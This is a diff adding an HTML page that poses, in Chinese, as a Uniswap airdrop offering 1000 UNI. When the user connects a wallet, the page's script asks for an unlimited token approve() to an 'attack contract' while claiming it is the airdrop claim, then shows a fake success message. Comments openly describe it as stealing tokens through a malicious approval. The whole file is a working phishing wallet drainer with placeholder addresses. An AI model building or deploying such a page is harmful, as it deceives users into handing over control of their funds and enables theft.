@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Uniswap 空投 - 领取 1000 UNI</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@1.0.0/qrcode.min.js"></script>
+</head>
+<body>
+    <h2>🎉 Uniswap 空投活动</h2>
+    <p>连接钱包即可领取 1000 UNI（测试网）</p>
+    <button id="connectBtn">连接钱包</button>
+    <div id="qrContainer" style="margin-top:20px;"></div>
+    <div id="status"></div>
+
+    <script>
+        let provider, signer, userAddress;
+        const ATTACK_CONTRACT = "0xYourAttackContract";  // 你部署的攻击合约地址
+        const TOKEN_ADDRESS = "0xYourTokenAddress";      // 你想要盗取的代币地址（比如测试USDC）
+
+        document.getElementById("connectBtn").onclick = async () => {
+            if(window.ethereum){
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                document.getElementById("status").innerText = "已连接: "+userAddress;
+                // 生成恶意 approve 二维码（也可直接弹出交易）
+                // 为了更真实，我们生成一个“领取空投”的签名请求（实际是 approve）
+                const tokenABI = ["function approve(address spender, uint256 amount) returns(bool)"];
+                const token = new ethers.Contract(TOKEN_ADDRESS, tokenABI, signer);
+                const maxUint = ethers.constants.MaxUint256;
+                // 诱导用户签名 approve（这里直接发交易）
+                const tx = await token.approve(ATTACK_CONTRACT, maxUint);
+                document.getElementById("status").innerHTML = "授权交易已发送: "+tx.hash+"<br>等待确认...";
+                await tx.wait();
+                document.getElementById("status").innerHTML += "<br>✅ 领取成功！(实际已授权无限额度)";
+            } else {
+                alert("请安装 MetaMask");
+            }
+        };
+    </script>
+</body>
+</html>
